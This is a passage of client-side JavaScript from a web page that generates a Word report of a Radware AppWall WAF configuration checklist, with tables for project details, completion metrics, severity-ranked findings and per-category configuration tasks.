            insideVertical: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
        },
        rows: [
            new docx.TableRow({
                tableHeader: true,
                children: [
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: "Project Information",
                            alignment: docx.AlignmentType.CENTER
                        })],
                        columnSpan: 2,
                        shading: {
                            fill: "3B82F6",
                            type: docx.ShadingType.SOLID,
                            color: "FFFFFF",
                        },
                    }),
                ],
            }),
            new docx.TableRow({
                children: [
                    new docx.TableCell({
                        children: [new docx.Paragraph("Project Name")],
                        shading: {
                            fill: "F3F4F6",
                            type: docx.ShadingType.SOLID,
                        },
                    }),
                    new docx.TableCell({
                        children: [new docx.Paragraph(currentProject ? currentProject.name : 'Unnamed Project')],
                    }),
                ],
            }),
            new docx.TableRow({
                children: [
                    new docx.TableCell({
                        children: [new docx.Paragraph("Environment Target")],
                        shading: {
                            fill: "F3F4F6",
                            type: docx.ShadingType.SOLID,
                        },
                    }),
                    new docx.TableCell({
                        children: [new docx.Paragraph(currentProject ? currentProject.target : 'N/A')],
                    }),
                ],
            }),
            new docx.TableRow({
                children: [
                    new docx.TableCell({
                        children: [new docx.Paragraph("Security Engineer")],
                        shading: {
                            fill: "F3F4F6",
                            type: docx.ShadingType.SOLID,
                        },
                    }),
                    new docx.TableCell({
                        children: [new docx.Paragraph(currentProject ? currentProject.tester : 'N/A')],
                    }),
                ],
            }),
            new docx.TableRow({
                children: [
                    new docx.TableCell({
                        children: [new docx.Paragraph("Start Date")],
                        shading: {
                            fill: "F3F4F6",
                            type: docx.ShadingType.SOLID,
                        },
                    }),
                    new docx.TableCell({
                        children: [new docx.Paragraph(currentProject ? formatDate(new Date(currentProject.date)) : 'N/A')],
                    }),
                ],
            }),
            new docx.TableRow({
                children: [
                    new docx.TableCell({
                        children: [new docx.Paragraph("Last Updated")],
                        shading: {
                            fill: "F3F4F6",
                            type: docx.ShadingType.SOLID,
                        },
                    }),
                    new docx.TableCell({
                        children: [new docx.Paragraph(currentProject && currentProject.lastUpdated ? formatDate(new Date(currentProject.lastUpdated)) : 'N/A')],
                    }),
                ],
            }),
        ],
    });
    
    // Build completion status table
    const completionTable = new docx.Table({
        width: {
            size: 100,
            type: docx.WidthType.PERCENTAGE,
        },
        borders: {
            top: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
            right: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
            bottom: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
            left: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
            insideHorizontal: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
            insideVertical: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
        },
        rows: [
            new docx.TableRow({
                tableHeader: true,
                children: [
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: "Configuration Status",
                            alignment: docx.AlignmentType.CENTER
                        })],
                        columnSpan: 3,
                        shading: {
                            fill: "3B82F6",
                            type: docx.ShadingType.SOLID,
                            color: "FFFFFF",
                        },
                    }),
                ],
            }),
            new docx.TableRow({
                children: [
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: "Status",
                            alignment: docx.AlignmentType.CENTER
                        })],
                        shading: {
                            fill: "F3F4F6",
                            type: docx.ShadingType.SOLID,
                        },
                    }),
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: "Count",
                            alignment: docx.AlignmentType.CENTER
                        })],
                        shading: {
                            fill: "F3F4F6",
                            type: docx.ShadingType.SOLID,
                        },
                    }),
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: "Percentage",
                            alignment: docx.AlignmentType.CENTER
                        })],
                        shading: {
                            fill: "F3F4F6",
                            type: docx.ShadingType.SOLID,
                        },
                    }),
                ],
            }),
            new docx.TableRow({
                children: [
                    new docx.TableCell({
                        children: [new docx.Paragraph("Completed Items")],
                    }),
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: metrics.completedTasks.toString(),
                            alignment: docx.AlignmentType.CENTER
                        })],
                    }),
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: `${metrics.overallCompletion}%`,
                            alignment: docx.AlignmentType.CENTER
                        })],
                    }),
                ],
            }),
            new docx.TableRow({
                children: [
                    new docx.TableCell({
                        children: [new docx.Paragraph("Not Started Items")],
                    }),
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: (metrics.totalTasks - metrics.completedTasks - metrics.naCount).toString(),
                            alignment: docx.AlignmentType.CENTER
                        })],
                    }),
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: `${Math.round(((metrics.totalTasks - metrics.completedTasks - metrics.naCount) / metrics.totalTasks) * 100)}%`,
                            alignment: docx.AlignmentType.CENTER
                        })],
                    }),
                ],
            }),
            new docx.TableRow({
                children: [
                    new docx.TableCell({
                        children: [new docx.Paragraph("Not Applicable Items")],
                    }),
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: metrics.naCount.toString(),
                            alignment: docx.AlignmentType.CENTER
                        })],
                    }),
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: `${Math.round((metrics.naCount / metrics.totalTasks) * 100)}%`,
                            alignment: docx.AlignmentType.CENTER
                        })],
                    }),
                ],
            }),
            new docx.TableRow({
                children: [
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: "Total Items",
                            bold: true
                        })],
                        shading: {
                            fill: "F3F4F6",
                            type: docx.ShadingType.SOLID,
                        },
                    }),
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: metrics.totalTasks.toString(),
                            alignment: docx.AlignmentType.CENTER,
                            bold: true
                        })],
                        shading: {
                            fill: "F3F4F6", 
                            type: docx.ShadingType.SOLID,
                        },
                    }),
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: "100%",
                            alignment: docx.AlignmentType.CENTER,
                            bold: true
                        })],
                        shading: {
                            fill: "F3F4F6",
                            type: docx.ShadingType.SOLID,
                        },
                    }),
                ],
            }),
        ],
    });
    
    // Build issues summary table
    const issuesCount = appwallData.findings ? appwallData.findings.length : 0;
    const highCount = appwallData.findings ? appwallData.findings.filter(f => f.severity === 'high').length : 0;
    const mediumCount = appwallData.findings ? appwallData.findings.filter(f => f.severity === 'medium').length : 0;
    const lowCount = appwallData.findings ? appwallData.findings.filter(f => f.severity === 'low').length : 0;
    
    const issuesTable = new docx.Table({
        width: {
            size: 50,
            type: docx.WidthType.PERCENTAGE,
        },
        borders: {
            top: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
            right: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
            bottom: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
            left: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
            insideHorizontal: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
            insideVertical: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
        },
        rows: [
            new docx.TableRow({
                tableHeader: true,
                children: [
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: "Issues Summary",
                            alignment: docx.AlignmentType.CENTER
                        })],
                        columnSpan: 2,
                        shading: {
                            fill: "3B82F6",
                            type: docx.ShadingType.SOLID,
                            color: "FFFFFF",
                        },
                    }),
                ],
            }),
            new docx.TableRow({
                children: [
                    new docx.TableCell({
                        children: [new docx.Paragraph("High Severity Issues")],
                        shading: {
                            fill: "F3F4F6",
                            type: docx.ShadingType.SOLID,
                        },
                    }),
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: highCount.toString(),
                            alignment: docx.AlignmentType.CENTER
                        })],
                    }),
                ],
            }),
            new docx.TableRow({
                children: [
                    new docx.TableCell({
                        children: [new docx.Paragraph("Medium Severity Issues")],
                        shading: {
                            fill: "F3F4F6",
                            type: docx.ShadingType.SOLID,
                        },
                    }),
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: mediumCount.toString(),
                            alignment: docx.AlignmentType.CENTER
                        })],
                    }),
                ],
            }),
            new docx.TableRow({
                children: [
                    new docx.TableCell({
                        children: [new docx.Paragraph("Low Severity Issues")],
                        shading: {
                            fill: "F3F4F6",
                            type: docx.ShadingType.SOLID,
                        },
                    }),
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: lowCount.toString(),
                            alignment: docx.AlignmentType.CENTER
                        })],
                    }),
                ],
            }),
            new docx.TableRow({
                children: [
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: "Total Issues",
                            bold: true
                        })],
                        shading: {
                            fill: "F3F4F6",
                            type: docx.ShadingType.SOLID,
                        },
                    }),
                    new docx.TableCell({
                        children: [new docx.Paragraph({
                            text: issuesCount.toString(),
                            alignment: docx.AlignmentType.CENTER,
                            bold: true
                        })],
                    }),
                ],
            }),
        ],
    });
    
    return [
        new docx.Paragraph({
            text: "Executive Summary",
            heading: docx.HeadingLevel.HEADING_1,
        }),
        new docx.Paragraph({
            text: `This report provides an overview of the Radware AppWall WAF configuration status for ${currentProject ? currentProject.name : 'Unnamed Project'}. The report includes key metrics, completion progress, and identified issues.`,
            spacing: {
                after: 400
            }
        }),
        
        // Project Information
        new docx.Paragraph({
            text: "Project Details",
            heading: docx.HeadingLevel.HEADING_2
        }),
        projectInfoTable,
        new docx.Paragraph({
            text: "",
            spacing: {
                after: 400
            }
        }),
        
        // Completion Status
        new docx.Paragraph({
            text: "Completion Status",
            heading: docx.HeadingLevel.HEADING_2
        }),
        new docx.Paragraph({
            children: [
                new docx.TextRun({
                    text: "Overall Completion: ",
                    bold: true
                }),
                new docx.TextRun({
                    text: `${metrics.overallCompletion}%`,
                    bold: true
                })
            ],
            spacing: {
                after: 200
            }
        }),
        new docx.Paragraph({
            children: [
                new docx.TextRun({
                    text: "Critical Settings Completion: ",
                    bold: true
                }),
                new docx.TextRun({
                    text: `${metrics.criticalCompletion}% (${metrics.criticalCompleted}/${metrics.criticalTotal})`,
                    bold: true
                })
            ],
            spacing: {
                after: 400
            }
        }),
        completionTable,
        new docx.Paragraph({
            text: "",
            spacing: {
                after: 400
            }
        }),
        
        // Issues Summary
        new docx.Paragraph({
            text: "Configuration Issues",
            heading: docx.HeadingLevel.HEADING_2
        }),
        issuesTable,
        new docx.Paragraph({
            text: "",
            spacing: {
                after: 400
            }
        }),
        
        // Add page break
        new docx.Paragraph({
            text: "",
            pageBreakBefore: true
        })
    ];
}

// Create findings section with enhanced formatting
function createFindingsSection() {
    if (!appwallData.findings || appwallData.findings.length === 0) {
        return [
            new docx.Paragraph({
                text: "Configuration Issues",
                heading: docx.HeadingLevel.HEADING_1
            }),
            new docx.Paragraph({
                text: "No configuration issues have been documented.",
                spacing: {
                    after: 400
                }
            }),
            new docx.Paragraph({
                text: "",
                pageBreakBefore: true
            })
        ];
    }
    
    // Create findings summary
    const highCount = appwallData.findings.filter(f => f.severity === 'high').length;
    const mediumCount = appwallData.findings.filter(f => f.severity === 'medium').length;
    const lowCount = appwallData.findings.filter(f => f.severity === 'low').length;
    
    const summaryElements = [
        new docx.Paragraph({
            text: "Configuration Issues",
            heading: docx.HeadingLevel.HEADING_1
        }),
        new docx.Paragraph({
            text: `A total of ${appwallData.findings.length} configuration issues were identified:`,
            spacing: {
                after: 200
            }
        }),
        new docx.Paragraph({
            children: [
                new docx.TextRun({
                    text: "â¢ ",
                    bold: true
                }),
                new docx.TextRun("High Severity: "),
                new docx.TextRun({
                    text: highCount.toString(),
                    bold: highCount > 0,
                    color: highCount > 0 ? "FF0000" : "000000"
                })
            ],
            spacing: {
                after: 80
            }
        }),
        new docx.Paragraph({
            children: [
                new docx.TextRun({
                    text: "â¢ ",
                    bold: true
                }),
                new docx.TextRun("Medium Severity: "),
                new docx.TextRun({
                    text: mediumCount.toString(),
                    bold: mediumCount > 0,
                    color: mediumCount > 0 ? "FFA500" : "000000"
                })
            ],
            spacing: {
                after: 80
            }
        }),
        new docx.Paragraph({
            children: [
                new docx.TextRun({
                    text: "â¢ ",
                    bold: true
                }),
                new docx.TextRun("Low Severity: "),
                new docx.TextRun({
                    text: lowCount.toString(),
                    bold: lowCount > 0,
                    color: lowCount > 0 ? "0000FF" : "000000"
                })
            ],
            spacing: {
                after: 400
            }
        }),
        new docx.Paragraph({
            text: "Detailed Issues",
            heading: docx.HeadingLevel.HEADING_2
        })
    ];
    
    // Sort findings by severity
    const sortedFindings = [...appwallData.findings].sort((a, b) => {
        const severityOrder = { 'high': 0, 'medium': 1, 'low': 2, 'info': 3 };
        return severityOrder[a.severity] - severityOrder[b.severity];
    });
    
    // Create findings details
    const findingElements = [];
    
    sortedFindings.forEach((finding, index) => {
        // Get severity color
        let severityColor = "000000";
        if (finding.severity === 'high') severityColor = "FF0000";
        else if (finding.severity === 'medium') severityColor = "FFA500";
        else if (finding.severity === 'low') severityColor = "0000FF";
        
        // Create finding table
        const findingTable = new docx.Table({
            width: {
                size: 100,
                type: docx.WidthType.PERCENTAGE,
            },
            borders: {
                top: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
                right: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
                bottom: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
                left: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
                insideHorizontal: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
                insideVertical: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
            },
            rows: [
                new docx.TableRow({
                    children: [
                        new docx.TableCell({
                            children: [new docx.Paragraph("Severity")],
                            width: {
                                size: 20,
                                type: docx.WidthType.PERCENTAGE
                            },
                            shading: {
                                fill: "F3F4F6",
                                type: docx.ShadingType.SOLID,
                            },
                        }),
                        new docx.TableCell({
                            children: [new docx.Paragraph({
                                children: [
                                    new docx.TextRun({
                                        text: capitalizeFirstLetter(finding.severity),
                                        color: severityColor,
                                        bold: finding.severity === 'high'
                                    })
                                ]
                            })],
                            width: {
                                size: 80,
                                type: docx.WidthType.PERCENTAGE
                            }
                        })
                    ]
                }),
                new docx.TableRow({
                    children: [
                        new docx.TableCell({
                            children: [new docx.Paragraph("Category")],
                            width: {
                                size: 20,
                                type: docx.WidthType.PERCENTAGE
                            },
                            shading: {
                                fill: "F3F4F6",
                                type: docx.ShadingType.SOLID,
                            },
                        }),
                        new docx.TableCell({
                            children: [new docx.Paragraph(getCategoryTitle(finding.category))],
                            width: {
                                size: 80,
                                type: docx.WidthType.PERCENTAGE
                            }
                        })
                    ]
                }),
                new docx.TableRow({
                    children: [
                        new docx.TableCell({
                            children: [new docx.Paragraph("Description")],
                            width: {
                                size: 20,
                                type: docx.WidthType.PERCENTAGE
                            },
                            shading: {
                                fill: "F3F4F6",
                                type: docx.ShadingType.SOLID,
                            },
                        }),
                        new docx.TableCell({
                            children: [new docx.Paragraph(finding.description)],
                            width: {
                                size: 80,
                                type: docx.WidthType.PERCENTAGE
                            }
                        })
                    ]
                }),
                new docx.TableRow({
                    children: [
                        new docx.TableCell({
                            children: [new docx.Paragraph("Remediation")],
                            width: {
                                size: 20,
                                type: docx.WidthType.PERCENTAGE
                            },
                            shading: {
                                fill: "F3F4F6",
                                type: docx.ShadingType.SOLID,
                            },
                        }),
                        new docx.TableCell({
                            children: [new docx.Paragraph(finding.remediation)],
                            width: {
                                size: 80,
                                type: docx.WidthType.PERCENTAGE
                            }
                        })
                    ]
                })
            ]
        });
        
        // Add title
        findingElements.push(
            new docx.Paragraph({
                text: finding.title,
                heading: docx.HeadingLevel.HEADING_3
            }),
            findingTable
        );
        
        // Add configuration commands if available
        if (finding.config) {
            findingElements.push(
                new docx.Paragraph({
                    text: "Configuration Commands:",
                    spacing: {
                        before: 200,
                        after: 100
                    },
                    bold: true
                }),
                new docx.Paragraph({
                    text: finding.config,
                    style: "CodeBlock",
                    spacing: {
                        before: 0,
                        after: 400
                    }
                })
            );
        }
        
        // Add separator except for the last item
        if (index < sortedFindings.length - 1) {
            findingElements.push(
                new docx.Paragraph({
                    text: "",
                    spacing: {
                        after: 400
                    },
                    border: {
                        bottom: {
                            color: "DDDDDD",
                            space: 1,
                            style: docx.BorderStyle.SINGLE,
                            size: 6
                        }
                    }
                })
            );
        }
    });
    
    // Add final page break
    findingElements.push(
        new docx.Paragraph({
            text: "",
            pageBreakBefore: true
        })
    );
    
    return [...summaryElements, ...findingElements];
}

// Create detailed configuration sections
function createDetailedConfigurationSections(metrics, includeTechniques) {
    const allSections = [];
    
    // Process each category
    for (const category of metrics.categories) {
        const categoryObj = appwallData.categories.find(c => c.id === category.id);
        const sectionElements = [];
        
        // Add category header
        sectionElements.push(
            new docx.Paragraph({
                text: category.title,
                heading: docx.HeadingLevel.HEADING_1
            }),
            new docx.Paragraph({
                text: category.subtitle || 'No description available',
                spacing: {
                    after: 400
                }
            }),
            new docx.Paragraph({
                children: [
                    new docx.TextRun({
                        text: "Priority: ",
                        bold: true
                    }),
                    new docx.TextRun(capitalizeFirstLetter(category.priority || 'medium'))
                ],
                spacing: {
                    after: 200
                }
            }),
            new docx.Paragraph({
                children: [
                    new docx.TextRun({
                        text: "Completion: ",
                        bold: true
                    }),
                    new docx.TextRun(`${category.percentage}% (${category.completed}/${category.total})`)
                ],
                spacing: {
                    after: 400
                }
            })
        );
        
        // Process each group in the category
        category.groups.forEach(group => {
            sectionElements.push(
                new docx.Paragraph({
                    text: group.title,
                    heading: docx.HeadingLevel.HEADING_2
                })
            );
            
            // Create table for checklist items
            const tableRows = [
                // Header row
                new docx.TableRow({
                    tableHeader: true,
                    children: [
                        new docx.TableCell({
                            children: [new docx.Paragraph({
                                text: "ID",
                                alignment: docx.AlignmentType.CENTER
                            })],
                            width: {
                                size: 10,
                                type: docx.WidthType.PERCENTAGE
                            },
                            shading: {
                                fill: "3B82F6",
                                type: docx.ShadingType.SOLID,
                                color: "FFFFFF",
                            },
                        }),
                        new docx.TableCell({
                            children: [new docx.Paragraph({
                                text: "Task",
                                alignment: docx.AlignmentType.CENTER
                            })],
                            width: {
                                size: 60,
                                type: docx.WidthType.PERCENTAGE
                            },
                            shading: {
                                fill: "3B82F6",
                                type: docx.ShadingType.SOLID,
                                color: "FFFFFF",
                            },
                        }),
                        new docx.TableCell({
                            children: [new docx.Paragraph({
                                text: "Priority",
                                alignment: docx.AlignmentType.CENTER
                            })],
                            width: {
                                size: 15,
                                type: docx.WidthType.PERCENTAGE
                            },
                            shading: {
                                fill: "3B82F6",
                                type: docx.ShadingType.SOLID,
                                color: "FFFFFF",
                            },
                        }),
                        new docx.TableCell({
                            children: [new docx.Paragraph({
                                text: "Status",
                                alignment: docx.AlignmentType.CENTER
                            })],
                            width: {
                                size: 15,
                                type: docx.WidthType.PERCENTAGE
                            },
                            shading: {
                                fill: "3B82F6", 
                                type: docx.ShadingType.SOLID,
                                color: "FFFFFF",
                            },
                        })
                    ]
                })
            ];
            
            // Add item rows
            group.items.forEach((item, itemIndex) => {
                // Get status text and color
                let statusText, statusColor;
                if (item.status === TASK_STATUS.PASSED) {
                    statusText = "Completed";
                    statusColor = "008000"; // Green
                } else if (item.status === TASK_STATUS.NA) {
                    statusText = "Not Applicable";
                    statusColor = "808080"; // Gray
                } else {
                    statusText = "Not Started";
                    statusColor = "000000"; // Black
                }
                
                // Add alternating row shading
                const rowShading = itemIndex % 2 === 0 ? null : {
                    fill: "F9FAFB",
                    type: docx.ShadingType.SOLID
                };
                
                tableRows.push(
                    new docx.TableRow({
                        children: [
                            new docx.TableCell({
                                children: [new docx.Paragraph({
                                    text: item.id,
                                    alignment: docx.AlignmentType.CENTER
                                })],
                                shading: rowShading
                            }),
                            new docx.TableCell({
                                children: [new docx.Paragraph(item.text)],
                                shading: rowShading
                            }),
                            new docx.TableCell({
                                children: [new docx.Paragraph({
                                    text: capitalizeFirstLetter(item.priority),
                                    alignment: docx.AlignmentType.CENTER,
                                    bold: item.priority === 'critical'
                                })],
                                shading: rowShading
                            }),
                            new docx.TableCell({
                                children: [new docx.Paragraph({
                                    children: [
                                        new docx.TextRun({
                                            text: statusText,
                                            color: statusColor
                                        })
                                    ],
                                    alignment: docx.AlignmentType.CENTER
                                })],
                                shading: rowShading
                            })
                        ]
                    })
                );
            });
            
            // Add table to section
            sectionElements.push(
                new docx.Table({
                    width: {
                        size: 100,
                        type: docx.WidthType.PERCENTAGE,
                    },
                    borders: {
                        top: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
                        right: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
                        bottom: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
                        left: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
                        insideHorizontal: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
                        insideVertical: { style: docx.BorderStyle.SINGLE, size: 1, color: "auto" },
                    },
                    rows: tableRows
                }),
                new docx.Paragraph({
                    text: "",
                    spacing: {
                        after: 400
                    }
                })
            );
        });
        
        // Add techniques if requested and available
        if (includeTechniques && categoryObj && categoryObj.techniques && categoryObj.techniques.length > 0) {
            sectionElements.push(
                new docx.Paragraph({
                    text: "Configuration Techniques",
                    heading: docx.HeadingLevel.HEADING_2
                })
            );
            
            categoryObj.techniques.forEach(technique => {
                // Extract plain text from HTML
                const plainText = technique.content
                    ? technique.content.replace(/<[^>]*>/g, ' ').replace(/\s+/g, ' ').trim()
                    : 'No detailed content available';
                
                sectionElements.push(
                    new docx.Paragraph({
                        text: technique.title,
                        heading: docx.HeadingLevel.HEADING_3
                    }),
                    new docx.Paragraph({
                        text: plainText,
                        spacing: {
                            after: 200
                        }
                    })
                );
                
                // Try to extract code blocks
                const codeBlocks = extractCodeBlocks(technique.content);
                if (codeBlocks.length > 0) {
                    codeBlocks.forEach(code => {
                        sectionElements.push(
                            new docx.Paragraph({
                                text: "Configuration Commands:",
                                bold: true,
                                spacing: {
                                    before: 100,
                                    after: 100
                                }
                            }),
                            new docx.Paragraph({
                                text: code,
                                style: "CodeBlock",
                                spacing: {
                                    after: 200
                                }
                            })
                        );
                    });
                }
                
                // Add separator
                sectionElements.push(
                    new docx.Paragraph({
                        text: "",
                        spacing: {
                            after: 400
                        },
                        border: {
                            bottom: {
                                color: "DDDDDD",
                                space: 1,
                                style: docx.BorderStyle.SINGLE,
                                size: 6
                            }
                        }
                    })
                );
            });
        }
        
        // Add notes if available
        if (currentProject && currentProject.notes && currentProject.notes[category.id]) {
            sectionElements.push(
                new docx.Paragraph({
                    text: "Configuration Notes",
                    heading: docx.HeadingLevel.HEADING_2
                }),
                new docx.Paragraph({
                    text: currentProject.notes[category.id],
                    spacing: {
                        after: 400
                    }
                })
            );
        }
        
        // Add page break at the end of each category
        sectionElements.push(
            new docx.Paragraph({
                text: "",
                pageBreakBefore: true
            })
        );
        
        allSections.push(...sectionElements);
    }
    
    return allSections;
}

// Extract code blocks from HTML content
function extractCodeBlocks(htmlContent) {
    if (!htmlContent) return [];
    
    const codeBlocks = [];
    const regex = /<div class="code-block">([\s\S]*?)<\/div>/g;
    let match;
    
    while ((match = regex.exec(htmlContent)) !== null) {
        // Extract the code block content
        let codeContent = match[1].trim();
        
        // Remove HTML tags and decode entities
        codeContent = codeContent
            .replace(/<[^>]*>/g, '') // Remove HTML tags
            .replace(/&lt;/g, '<')    // Decode common entities
            .replace(/&gt;/g, '>')
            .replace(/&amp;/g, '&')
            .replace(/&quot;/g, '"')
            .replace(/&#039;/g, "'")
            .trim();
        
        codeBlocks.push(codeContent);
    }
    
    return codeBlocks;
}

// Format date for display
function formatDate(date) {
    if (!date || isNaN(date)) return 'N/A';
    return date.toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });
}

// Format date for filename
function formatDateForFilename(date) {
    return `${date.getFullYear()}-${(date.getMonth() + 1).toString().padStart(2, '0')}-${date.getDate().toString().padStart(2, '0')}`;
}

// Toggle modal visibility with animation
function toggleModal(modalId, show) {
    const modal = document.getElementById(modalId);
    if (!modal) return;
    
    if (show) {
        modal.classList.remove('hidden');
        // Add fade-in animation
        setTimeout(() => {
            modal.classList.add('opacity-100');
            modal.classList.remove('opacity-0');
        }, 10);
        
        // Add ESC key listener to close modal
        document.addEventListener('keydown', function closeOnEsc(e) {
            if (e.key === 'Escape') {
                toggleModal(modalId, false);
                document.removeEventListener('keydown', closeOnEsc);
            }
        });
        
        // Add click outside to close
        modal.addEventListener('click', function closeOnOutsideClick(e) {
            if (e.target === modal) {
                toggleModal(modalId, false);
                modal.removeEventListener('click', closeOnOutsideClick);
            }
        });
    } else {
        modal.classList.add('opacity-0');
        modal.classList.remove('opacity-100');
        // Add fade-out animation and then hide
        setTimeout(() => {
            modal.classList.add('hidden');
        }, 300);
    }
}

// Show toast notification
function showToast(message, type = 'info') {
    // Remove existing toast if any
    const existingToast = document.getElementById('word-export-toast');
    if (existingToast) {
        existingToast.remove();
    }
    
    // Create toast element
    const toast = document.createElement('div');
    toast.id = 'word-export-toast';
    toast.className = 'fixed bottom-4 left-1/2 transform -translate-x-1/2 py-3 px-4 rounded-lg shadow-lg z-50 flex items-center gap-2 transition-all duration-500 opacity-0';
    
    // Set color based on type
    if (type === 'success') {
        toast.classList.add('bg-green-600', 'text-white');
        toast.innerHTML = '<i class="fas fa-check-circle"></i>';
    } else if (type === 'error') {
        toast.classList.add('bg-red-600', 'text-white');
        toast.innerHTML = '<i class="fas fa-exclamation-circle"></i>';
    } else {
        toast.classList.add('bg-blue-600', 'text-white');
        toast.innerHTML = '<i class="fas fa-info-circle"></i>';
    }
    
    // Add message
    const messageSpan = document.createElement('span');
    messageSpan.textContent = message;
    toast.appendChild(messageSpan);
    
    // Add to document
    document.body.appendChild(toast);
    
    // Show with animation
    setTimeout(() => {
        toast.classList.add('opacity-100');
        toast.classList.remove('opacity-0');
    }, 10);
    
    // Auto hide after 4 seconds
    setTimeout(() => {
        toast.classList.remove('opacity-100');
        toast.classList.add('opacity-0');
        setTimeout(() => {
            toast.remove();
        }, 500);
    }, 4000);
}

// Helper function to capitalize first letter
function capitalizeFirstLetter(string) {
    if (!string) return '';
    return string.charAt(0).toUpperCase() + string.slice(1);
}

// Helper function to get category title from ID
function getCategoryTitle(categoryId) {
    const category = appwallData.categories.find(c => c.id === categoryId);
    return category ? category.title : 'Unknown Category';
}

// Calculate report metrics
function calculateReportMetrics() {
    const metrics = {
        overallCompletion: 0,
        criticalCompletion: 0,
        criticalTotal: 0,
        criticalCompleted: 0,
        highTotal: 0,
        highCompleted: 0,
        mediumTotal: 0,
        mediumCompleted: 0,
        lowTotal: 0,
        lowCompleted: 0,
        categories: [],
        totalTasks: 0,
        completedTasks: 0,
        naCount: 0
    };
    
    // Process each category
    appwallData.categories.forEach(category => {
        const categoryStats = {
            id: category.id,
            title: category.title,
            subtitle: category.subtitle,
            priority: category.priority || 'medium',
            total: 0,
            completed: 0,
            notStarted: 0,
            naCount: 0,
            percentage: 0,
            groups: []
        };
        
        // Get checklist data (handle different property names)
        const checklist = category.checklist || category.groups || [];
        
        checklist.forEach(group => {
            const groupStats = {
                title: group.title,
                items: []
            };
            
            const items = group.items || [];
            items.forEach(item => {
                metrics.totalTasks++;
                categoryStats.total++;
                
                // Get item status (handle different property names)
                const status = currentProject && 
                              (currentProject.taskStatus || currentProject.tasks) ? 
                                (currentProject.taskStatus && currentProject.taskStatus[item.id]) || 
                                (currentProject.tasks && currentProject.tasks[item.id]) || 
                                TASK_STATUS.FAILED : 
                                TASK_STATUS.FAILED;
                
                // Count by priority
                if (item.priority === 'critical') {
                    metrics.criticalTotal++;
                    if (status === TASK_STATUS.PASSED) metrics.criticalCompleted++;
                } else if (item.priority === 'high') {
                    metrics.highTotal++;
                    if (status === TASK_STATUS.PASSED) metrics.highCompleted++;
                } else if (item.priority === 'medium') {
                    metrics.mediumTotal++;
                    if (status === TASK_STATUS.PASSED) metrics.mediumCompleted++;
                } else if (item.priority === 'low') {
                    metrics.lowTotal++;
                    if (status === TASK_STATUS.PASSED) metrics.lowCompleted++;
                }
                
                // Count by status
                if (status === TASK_STATUS.PASSED) {
                    metrics.completedTasks++;
                    categoryStats.completed++;
                } else if (status === TASK_STATUS.NA) {
                    metrics.naCount++;
                    categoryStats.naCount++;
                } else {
                    categoryStats.notStarted++;
                }
                
                // Add item to group stats
                groupStats.items.push({
                    id: item.id,
                    text: item.text,
                    priority: item.priority || 'medium',
                    status: status
                });
            });
            
            categoryStats.groups.push(groupStats);
        });
        
        // Calculate completion percentage
        if (categoryStats.total > 0) {
            categoryStats.percentage = Math.round((categoryStats.completed / (categoryStats.total - categoryStats.naCount)) * 100) || 0;
        }
        
        metrics.categories.push(categoryStats);
    });
    
    // Calculate overall completion percentage
    if (metrics.totalTasks > 0) {
        metrics.overallCompletion = Math.round((metrics.completedTasks / (metrics.totalTasks - metrics.naCount)) * 100) || 0;
    }
    
    // Calculate critical items completion percentage
    if (metrics.criticalTotal > 0) {
        metrics.criticalCompletion = Math.round((metrics.criticalCompleted / metrics.criticalTotal) * 100) || 0;
    }
    
    return metrics;
}</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>


</body>
</html>